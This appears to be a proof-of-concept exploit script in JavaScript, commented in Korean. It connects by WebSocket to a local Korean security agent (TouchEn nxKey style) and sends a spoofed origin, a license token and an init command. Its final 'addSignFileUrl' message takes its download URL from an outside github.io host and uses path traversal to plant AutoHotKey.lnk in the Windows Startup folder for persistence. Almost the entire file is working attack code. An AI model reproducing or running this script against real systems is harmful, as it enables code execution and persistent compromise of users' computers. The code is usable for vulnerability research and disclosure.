(function () {
  const wsUrl = 'wss://127.0.0.1:34581/raon/touchenex/Call';

  const messages = [
    {
      tabid: "1751477550816_452314",
      init: "get_versions",
      m: "biz",
      origin: "https://e-shy.net",
      lic: "eyJ2ZXJzaW9uIjoiMS4wIiwiaXNzdWVfZGF0ZSI6IjIwMjUwNTEyMTIxNjAzIiwicHJvdG9jb2xfbmFtZSI6InRvdWNoZW5leCIsInV1aWQiOiJmOGY2M2VkMzI5YTc0MjNkYmU5NGYzZjQ1Nzg2YmMxZCIsImxpY2Vuc2UiOiJHbUFJeERsR0M1cGhGOVJJdjhEdUZJTGIzNE10Q3UvNFdHT2RHSENHZnoxRTNVSmpkcFNXYW9LUEFQUnYyMjRYK0lWekQ2dU5JUjNtdFNOY3BnR21pT3loSEJncUhlU1c5SWpudmFhK0dla1RTZzkvTGdzckpMeFpLMnVYQUNKUTluQ1RBRHcrSmludVdPWDc5a2xrVDl4cDZjaWt5SXFuSkQwYVJ6VUxvSkU9In0=",
      callback: ""
    },
    {
      id: "1751741104028_377391",
      tabid: "1751477550816_452314",
      module: "biz",
      cmd: "native",
      origin: "https://e-shy.net",
      exfunc: {
        fname: "init",
        args: [
          {
            verify: "true",
            sid: "1751136111053377391"
          }
        ]
      },
      callback: "ksbizInterface.commonCallback"
    },
    {
      id: "1751477574121_975409",
      tabid: "1751477550816_452314",
      module: "biz",
      cmd: "native",
      origin: "https://e-shy.net",
      exfunc: {
        fname: "addSignFileUrl",
        args: [
          {
            data: "3333333333333%26ksbizNonce%3D38AFEC39CB79F1276EBE",
            url: "https://localhost/file-to-sign.pdf",
            downloadUrl: "https://yistar0123.github.io/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/AutoHotKey.lnk/..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AutoHotKey.lnk"
            uploadUrl: "https://localhost/",
            options: {
              addNonce: true,
              signedAttribute: "signingTime",
              signAlgorithm: "SEED-CBC",
              disableExpireFilter: false,
              disableExpireWarn: false,
              autosign: "1"
            },
            sid: "1751136111053377391"
          }
        ]
      },
      callback: "ksbizInterface.commonCallback"
    }
  ];

  let step = 0;

  const log = (msg) => {
    const el = document.getElementById("log");
    if (el) el.textContent += msg + "\n";
    console.log(msg);
  };

  const ws = new WebSocket(wsUrl);

  ws.onopen = () => {
    log("✅ WebSocket 연결 성공");
    sendMessage();
  };

  ws.onmessage = (event) => {
    log("📥 수신 메시지:\n" + event.data);
    if (step === 0 || step === 1) {
      step++;
      setTimeout(sendMessage, 300);
    }
  };

  ws.onerror = (event) => {
    log("❌ WebSocket 오류 발생: " + (event.message || "[unknown]"));
  };

  ws.onclose = () => {
    log("🔌 WebSocket 연결 종료");
  };

  function sendMessage() {
    if (step < messages.length) {
      const msg = JSON.stringify(messages[step]);
      log(`📤 (${step + 1}/${messages.length}) 메시지 전송:\n${msg}`);
      ws.send(msg);
    } else {
      log("✅ 모든 메시지 전송 완료");
      ws.close();
    }
  }
})();
